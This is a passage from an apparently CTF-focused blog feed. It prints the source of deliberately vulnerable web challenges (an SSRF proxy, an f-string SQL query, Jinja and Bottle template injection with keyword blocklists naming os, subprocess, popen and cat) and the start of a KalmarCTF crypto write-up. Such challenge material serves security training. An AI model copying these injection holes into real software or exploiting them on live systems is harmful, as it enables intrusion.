class="keyword">return</span> string_output</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/proxy&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">nolettersproxy</span>():</span><br><span class="line">    url = flask.request.args.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> url:</span><br><span class="line">        <span class="keyword">return</span> flask.abort(<span class="number">400</span>, <span class="string">&#x27;No URL provided&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    target_url = <span class="string">&quot;http://lamentxu.top&quot;</span> + url</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> url:</span><br><span class="line">            <span class="keyword">return</span> flask.abort(<span class="number">403</span>, <span class="string">&#x27;I blacklist the whole alphabet, hiahiahiahiahiahiahia~~~~~~&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;.&quot;</span> <span class="keyword">in</span> url:</span><br><span class="line">        <span class="keyword">return</span> flask.abort(<span class="number">403</span>, <span class="string">&#x27;No ssrf allowed&#x27;</span>)</span><br><span class="line">    response = requests.get(target_url)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flask.Response(response.content, response.status_code)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db_search</span>(<span class="params">code</span>):</span><br><span class="line">    <span class="keyword">with</span> sqlite3.connect(<span class="string">&#x27;database.db&#x27;</span>) <span class="keyword">as</span> conn:</span><br><span class="line">        cur = conn.cursor()</span><br><span class="line">        cur.execute(<span class="string">f&quot;SELECT FATE FROM FATETABLE WHERE NAME=UPPER(UPPER(UPPER(UPPER(UPPER(UPPER(UPPER(&#x27;<span class="subst">&#123;code&#125;</span>&#x27;)))))))&quot;</span>)</span><br><span class="line">        found = cur.fetchone()</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span> <span class="keyword">if</span> found <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">else</span> found[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="built_in">print</span>(flask.request.remote_addr)</span><br><span class="line">    <span class="keyword">return</span> flask.render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/1337&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">api_search</span>():</span><br><span class="line">    <span class="keyword">if</span> flask.request.remote_addr == <span class="string">&#x27;127.0.0.1&#x27;</span>:</span><br><span class="line">        code = flask.request.args.get(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> code == <span class="string">&#x27;abcdefghi&#x27;</span>:</span><br><span class="line">            req = flask.request.args.get(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                req = binary_to_string(req)</span><br><span class="line">                <span class="built_in">print</span>(req)</span><br><span class="line">                req = json.loads(req) <span class="comment"># No one can hack it, right? Pickle unserialize is not secure, but json is ;)</span></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                flask.abort(<span class="number">400</span>, <span class="string">&quot;Invalid JSON&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;name&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> req:</span><br><span class="line">                flask.abort(<span class="number">400</span>, <span class="string">&quot;Empty Person&#x27;s name&quot;</span>)</span><br><span class="line"></span><br><span class="line">            name = req[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(name) &gt; <span class="number">6</span>:</span><br><span class="line">                flask.abort(<span class="number">400</span>, <span class="string">&quot;Too long&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;\&#x27;&#x27;</span> <span class="keyword">in</span> name:</span><br><span class="line">                flask.abort(<span class="number">400</span>, <span class="string">&quot;NO &#x27;&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;)&#x27;</span> <span class="keyword">in</span> name:</span><br><span class="line">                flask.abort(<span class="number">400</span>, <span class="string">&quot;NO )&quot;</span>)</span><br><span class="line">            <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            Some waf hidden here ;)</span></span><br><span class="line"><span class="string">            &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">            fate = db_search(name)</span><br><span class="line">            <span class="keyword">if</span> fate <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                flask.abort(<span class="number">404</span>, <span class="string">&quot;No such Person&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> &#123;<span class="string">&#x27;Fate&#x27;</span>: fate&#125;</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flask.abort(<span class="number">400</span>, <span class="string">&quot;Hello local, and hello hacker&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flask.abort(<span class="number">403</span>, <span class="string">&quot;Only local access allowed&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h2 id="now-you-see-me-1"><a class="markdownIt-Anchor" href="#now-you-see-me-1"></a> Now you see me 1*</h2><blockquote><p><code>&#123;%print("Welcome the four horsemen tonight!")%&#125;</code></p></blockquote><p><code>base64</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># YOU FOUND ME ;)</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@File    :   src.py</span></span><br><span class="line"><span class="string">@Time    :   2025/03/29 01:10:37</span></span><br><span class="line"><span class="string">@Author  :   LamentXU </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">enable_hook =  <span class="literal">False</span></span><br><span class="line">counter = <span class="number">0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">audit_checker</span>(<span class="params">event,args</span>):</span><br><span class="line">    <span class="keyword">global</span> counter</span><br><span class="line">    <span class="keyword">if</span> enable_hook:</span><br><span class="line">        <span class="keyword">if</span> event <span class="keyword">in</span> [<span class="string">&quot;exec&quot;</span>, <span class="string">&quot;compile&quot;</span>]:</span><br><span class="line">            counter += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> counter &gt; <span class="number">4</span>:</span><br><span class="line">                <span class="keyword">raise</span> RuntimeError(event)</span><br><span class="line"></span><br><span class="line">lock_within = [</span><br><span class="line">    <span class="string">&quot;debug&quot;</span>, <span class="string">&quot;form&quot;</span>, <span class="string">&quot;args&quot;</span>, <span class="string">&quot;values&quot;</span>, </span><br><span class="line">    <span class="string">&quot;headers&quot;</span>, <span class="string">&quot;json&quot;</span>, <span class="string">&quot;stream&quot;</span>, <span class="string">&quot;environ&quot;</span>,</span><br><span class="line">    <span class="string">&quot;files&quot;</span>, <span class="string">&quot;method&quot;</span>, <span class="string">&quot;cookies&quot;</span>, <span class="string">&quot;application&quot;</span>, </span><br><span class="line">    <span class="string">&#x27;data&#x27;</span>, <span class="string">&#x27;url&#x27;</span> ,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, </span><br><span class="line">    <span class="string">&quot;getattr&quot;</span>, <span class="string">&quot;_&quot;</span>, <span class="string">&quot;&#123;&#123;&quot;</span>, <span class="string">&quot;&#125;&#125;&quot;</span>, </span><br><span class="line">    <span class="string">&quot;[&quot;</span>, <span class="string">&quot;]&quot;</span>, <span class="string">&quot;\\&quot;</span>, <span class="string">&quot;/&quot;</span>,<span class="string">&quot;self&quot;</span>, </span><br><span class="line">    <span class="string">&quot;lipsum&quot;</span>, <span class="string">&quot;cycler&quot;</span>, <span class="string">&quot;joiner&quot;</span>, <span class="string">&quot;namespace&quot;</span>, </span><br><span class="line">    <span class="string">&quot;init&quot;</span>, <span class="string">&quot;dir&quot;</span>, <span class="string">&quot;join&quot;</span>, <span class="string">&quot;decode&quot;</span>, </span><br><span class="line">    <span class="string">&quot;batch&quot;</span>, <span class="string">&quot;first&quot;</span>, <span class="string">&quot;last&quot;</span> , </span><br><span class="line">    <span class="string">&quot; &quot;</span>,<span class="string">&quot;dict&quot;</span>,<span class="string">&quot;list&quot;</span>,<span class="string">&quot;g.&quot;</span>,</span><br><span class="line">    <span class="string">&quot;os&quot;</span>, <span class="string">&quot;subprocess&quot;</span>,</span><br><span class="line">    <span class="string">&quot;g|a&quot;</span>, <span class="string">&quot;GLOBALS&quot;</span>, <span class="string">&quot;lower&quot;</span>, <span class="string">&quot;upper&quot;</span>,</span><br><span class="line">    <span class="string">&quot;BUILTINS&quot;</span>, <span class="string">&quot;select&quot;</span>, <span class="string">&quot;WHOAMI&quot;</span>, <span class="string">&quot;path&quot;</span>,</span><br><span class="line">    <span class="string">&quot;os&quot;</span>, <span class="string">&quot;popen&quot;</span>, <span class="string">&quot;cat&quot;</span>, <span class="string">&quot;nl&quot;</span>, <span class="string">&quot;app&quot;</span>, <span class="string">&quot;setattr&quot;</span>, <span class="string">&quot;translate&quot;</span>,</span><br><span class="line">    <span class="string">&quot;sort&quot;</span>, <span class="string">&quot;base64&quot;</span>, <span class="string">&quot;encode&quot;</span>, <span class="string">&quot;\\u&quot;</span>, <span class="string">&quot;pop&quot;</span>, <span class="string">&quot;referer&quot;</span>,</span><br><span class="line">    <span class="string">&quot;The closer you see, the lesser you find.&quot;</span>] </span><br><span class="line">        <span class="comment"># I hate all these.</span></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;try /H3dden_route&#x27;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/H3dden_route&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r3al_ins1de_th0ught</span>():</span><br><span class="line">    <span class="keyword">global</span> enable_hook, counter</span><br><span class="line">    name = flask.request.args.get(<span class="string">&#x27;My_ins1de_w0r1d&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> name:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> name.startswith(<span class="string">&quot;Follow-your-heart-&quot;</span>):</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> lock_within:</span><br><span class="line">                    <span class="keyword">if</span> i <span class="keyword">in</span> name:</span><br><span class="line">                        <span class="keyword">return</span> <span class="string">&#x27;NOPE.&#x27;</span></span><br><span class="line">                enable_hook = <span class="literal">True</span></span><br><span class="line">                a = flask.render_template_string(<span class="string">&#x27;&#123;#&#x27;</span>+<span class="string">f&#x27;<span class="subst">&#123;name&#125;</span>&#x27;</span>+<span class="string">&#x27;#&#125;&#x27;</span>)</span><br><span class="line">                enable_hook = <span class="literal">False</span></span><br><span class="line">                counter = <span class="number">0</span></span><br><span class="line">                <span class="keyword">return</span> a</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;My inside world is always hidden.&#x27;</span></span><br><span class="line">        <span class="keyword">except</span> RuntimeError <span class="keyword">as</span> e:</span><br><span class="line">            counter = <span class="number">0</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;NO.&#x27;</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Error&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Welcome to Hidden_route!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">import</span> os</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">import</span> _posixsubprocess</span><br><span class="line">        <span class="keyword">del</span> _posixsubprocess.fork_exec</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">import</span> subprocess</span><br><span class="line">    <span class="keyword">del</span> os.popen</span><br><span class="line">    <span class="keyword">del</span> os.system</span><br><span class="line">    <span class="keyword">del</span> subprocess.Popen</span><br><span class="line">    <span class="keyword">del</span> subprocess.call</span><br><span class="line">    <span class="keyword">del</span> subprocess.run</span><br><span class="line">    <span class="keyword">del</span> subprocess.check_output</span><br><span class="line">    <span class="keyword">del</span> subprocess.getoutput</span><br><span class="line">    <span class="keyword">del</span> subprocess.check_call</span><br><span class="line">    <span class="keyword">del</span> subprocess.getstatusoutput</span><br><span class="line">    <span class="keyword">del</span> subprocess.PIPE</span><br><span class="line">    <span class="keyword">del</span> subprocess.STDOUT</span><br><span class="line">    <span class="keyword">del</span> subprocess.CalledProcessError</span><br><span class="line">    <span class="keyword">del</span> subprocess.TimeoutExpired</span><br><span class="line">    <span class="keyword">del</span> subprocess.SubprocessError</span><br><span class="line">    sys.addaudithook(audit_checker)</span><br><span class="line">    app.run(debug=<span class="literal">False</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><h2 id="now-you-see-me-2"><a class="markdownIt-Anchor" href="#now-you-see-me-2"></a> Now you see me 2*</h2><blockquote><p><code>&#123;%print("We are the four horsemen.")%&#125; Now you see me 1flag</code></p></blockquote><h2 id=""><a class="markdownIt-Anchor" href="#"></a> *</h2><blockquote><p></p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@File    :   app.py</span></span><br><span class="line"><span class="string">@Time    :   2025/03/29 15:52:17</span></span><br><span class="line"><span class="string">@Author  :   LamentXU </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> bottle</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">flag in /flag</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="meta">@bottle.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello, World!&#x27;</span></span><br><span class="line"><span class="meta">@bottle.route(<span class="params"><span class="string">&#x27;/attack&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>():</span><br><span class="line">    payload = bottle.request.query.get(<span class="string">&#x27;payload&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> payload <span class="keyword">and</span> <span class="built_in">len</span>(payload) &lt; <span class="number">25</span> <span class="keyword">and</span> <span class="string">&#x27;open&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> payload <span class="keyword">and</span> <span class="string">&#x27;\\&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> payload:</span><br><span class="line">        <span class="keyword">return</span> bottle.template(<span class="string">&#x27;hello &#x27;</span>+payload)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        bottle.abort(<span class="number">400</span>, <span class="string">&#x27;Invalid payload&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    bottle.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p><a href="https://www.cnblogs.com/LAMENTXU/articles/18805019"></a></p><h2 id=""><a class="markdownIt-Anchor" href="#"></a> *</h2><blockquote><p><br />flag</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;*&lt;strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://gz.imxbt.cn/games/23&quot;&gt;&lt;/a&gt;&lt;/</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Cryptography</title>
    <link href="https://hvang10.github.io/2025/04/03/%E5%AF%86%E7%A0%81%E8%B6%A3%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>https://hvang10.github.io/2025/04/03/%E5%AF%86%E7%A0%81%E8%B6%A3%E9%A2%98%E8%AE%B0%E5%BD%95/</id>
    <published>2025-04-03T06:35:29.000Z</published>
    <updated>2025-08-28T07:32:20.162Z</updated>
    
    <content type="html"><![CDATA[<p>()</p><h1 id="kalmarctf2025-basic-sums"><a class="markdownIt-Anchor" href="#kalmarctf2025-basic-sums"></a> KalmarCTF2025 - basic sums</h1><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    flag = f.read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># I found this super cool function on stack overflow \o/ https://stackoverflow.com/questions/2267362/how-to-convert-an-integer-to-a-string-in-any-base</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">numberToBase</span>(<span class="params">n, b</span>):</span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> [<span class="number">0</span>]</span><br><span class="line">    digits = []</span><br><span class="line">    <span class="keyword">while</span> n:</span><br><span class="line">        digits.append(<span class="built_in">int</span>(n % b))</span><br><span class="line">        n //= b</span><br><span class="line">    <span class="keyword">return</span> digits[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag) &lt;= <span class="number">45</span></span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">int</span>.from_bytes(flag, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"></span><br><span class="line">base = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;Give me a base! &quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> base &lt; <span class="number">2</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Base is too small&quot;</span>)</span><br><span class="line">    quit()</span><br><span class="line"><span class="keyword">if</span> base &gt; <span class="number">256</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Base is too big&quot;</span>)</span><br><span class="line">    quit()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;Here you go! <span class="subst">&#123;<span class="built_in">sum</span>(numberToBase(flag, base))&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><p><strong>flagn</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mi>l</mi><mi>a</mi><mi>g</mi><mo>=</mo><msub><mi>a</mi><mi>n</mi></msub><msup><mi>b</mi><mi>n</mi></msup><mo>+</mo><msub><mi>a</mi><mrow><mi>n</mi><mo></mo><mn>1</mn></mrow></msub><msup><mi>b</mi><mrow><mi>n</mi><mo></mo><mn>1</mn></mrow></msup><mo>+</mo><msub><mi>a</mi><mrow><mi>n</mi><mo></mo><mn>2</mn></mrow></msub><msup><mi>b</mi><mrow><mi>n</mi><mo></mo><mn>2</mn></mrow></msup><mo>+</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo>+</mo><msub><mi>a</mi><mn>0</mn></msub><msup><mi>b</mi><mn>0</mn></msup></mrow><annotation encoding="application/x-tex">flag=a_{n}b^{n}+a_{n-1}b^{n-1}+a_{n-2}b^{n-2}+...+a_{0}b^{0}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0224389999999999em;vertical-align:-0.208331em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight"></span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight"></span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0224389999999999em;vertical-align:-0.208331em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight"></span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight"></span><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.964108em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span></span></span></span></span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext></mtext></mrow><annotation encoding="application/x-tex"></annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mi>l</mi><mi>a</mi><mi>g</mi><mo></mo><mi>s</mi><mi>u</mi><mi>m</mi><mi>s</mi><mo></mo><msub><mi>a</mi><mi>n</mi></msub><mo>+</mo><msub><mi>a</mi><mrow><mi>n</mi><mo></mo><mn>1</mn></mrow></msub><mo>+</mo><msub><mi>a</mi><mrow><mi>n</mi><mo></mo><mn>2</mn></mrow></msub><mo>+</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo>+</mo><msub><mi>a</mi><mn>1</mn></msub><mo>+</mo><msub><mi>a</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext></mtext><mi>b</mi><mo></mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">flag\equiv sums\equiv a_{n}+a_{n-1}+a_{n-2}+...+a_{1}+a_{1}(mod\ b-1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.46375em;vertical-align:0em;"></span><span class="mord mathnormal">s</span><span class="mord mathnormal">u</span><span class="mord mathnormal">m</span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.791661em;vertical-align:-0.208331em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight"></span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.791661em;vertical-align:-0.208331em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" 